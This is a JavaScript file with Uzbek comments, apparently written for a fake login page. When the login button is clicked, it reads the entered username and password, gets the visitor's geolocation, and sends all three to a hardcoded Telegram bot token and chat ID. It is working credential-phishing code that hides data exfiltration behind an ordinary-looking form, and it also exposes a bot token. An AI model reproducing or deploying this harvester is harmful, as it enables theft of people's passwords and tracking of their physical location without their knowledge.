// Elementlarni olish
let inputs = document.querySelectorAll('input');
let login_button = document.querySelector('.login-button');

// Telegram bot uchun sozlamalar
const Token = `7537112275:AAEBDntfpvhb-N5-QOAUWm16nsCaJfhYngE`;
const chatId = `6042672463`;

login_button.addEventListener('click', () => {
    let username = inputs[0].value.trim();
    let password = inputs[1].value.trim();

    // Bo'sh inputlarni tekshirish
    if (!username || !password) {
        alert("Iltimos, login va parolni kiriting.");
        return;
    }

    // Geolokatsiyani olish
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;

            console.log(latitude, longitude);

            // Xabarni joylashuv bilan birga tayyorlash
            let message = `
👤 Username: ${username}
🔑 Password: ${password}
📍 Location: https://www.google.com/maps?q=${latitude},${longitude}`;

            // Xabarni yuborish
            fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => {
                    if (response.ok) {
                        alert("Ma'lumot muvaffaqiyatli yuborildi.");
                    } else {
                        alert("Xabarni yuborishda xato yuz berdi.");
                    }
                    return response.json();
                })
                .then(data => console.log("Yuborildi:", data))
                .catch(error => {
                    console.error("Xato yuz berdi:", error);
                    alert("Serverga ulanishda xato yuz berdi.");
                });

            // Inputlarni tozalash
            inputs[0].value = '';
            inputs[1].value = '';
        }, error => {
            console.error("Geolokatsiya xatosi:", error.message);
            alert("Geolokatsiyani aniqlashda xato yuz berdi.");
        });
    } else {
        alert("Brauzer geolokatsiyani qo'llab-quvvatlamaydi.");
    }
});
